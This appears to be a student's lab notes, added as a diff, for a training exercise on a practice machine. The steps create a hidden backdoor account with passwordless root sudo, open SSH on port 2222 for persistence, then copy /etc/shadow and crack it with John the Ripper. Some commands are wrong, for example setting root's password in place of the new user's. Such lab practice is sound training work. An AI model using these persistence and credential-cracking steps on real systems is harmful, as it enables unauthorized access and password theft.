@@ -1,0 +1,61 @@
+Advanced Bash 
+
+STEP 1: Shadow People
+
+Create a secret user named sysd. Make sure this user doesn't have a home folder created:
+sudo useradd -m sysd
+
+Give you secret user a password
+sudo passwd root 
+
+Give your secret user a UID < 1000 
+usermod -u 666 sysd
+
+Give you secret user the same GID
+groupmod -g 666 sysd
+
+Give your secret user full sudo access without the need for a password
+sudo visudo
+Under #includedir /etc/sudoers.d 
+sysd ALL=(ALL) NOPASSWD:ALL
+
+Test that sudo access works without your password
+sudo -l    was successful. No prompt for password.
+Examples: sudo -v   no warning for sudo password asked
+sudo visudo       did not prompt a password
+
+STEP 2: Smooth Sailing
+
+Edit the ssh_config file
+nano /etc/ssh/sshd_config
+Under #Port 22 added Port 2222
+
+STEP 3: Testing Your Configuration Update
+
+Restart the ssh service
+sudo systemctl restart ssh.service
+
+Exit the root account
+exit 
+exit    connection to 192.168…closed 
+
+SSH to the target machine using your sysd account and port 2222
+ssh sysd@192.168.6.105 -p 2222
+Password prompt 
+Successful backdoor
+
+Use sudo to switch to root user
+sudo su
+Line now reads: root@scavenger-hunt:/home/sysd# 
+
+STEP 4: Crack all The Passwords
+
+SSH back into the system using you sysd account and port 2222
+ssh sysd@192.168.6.105 -p 2222
+
+Escalate your privileges to the root user. Use john to crack the entire etc/shadow file:
+Step 1: cp /etc/shadow  /home/sysd/Documents
+Step 2: mv shadow shadow.txt
+Step 3: john shadow.txt
+Step 4: verified cracked passwords   john - -show shadow.txt
+
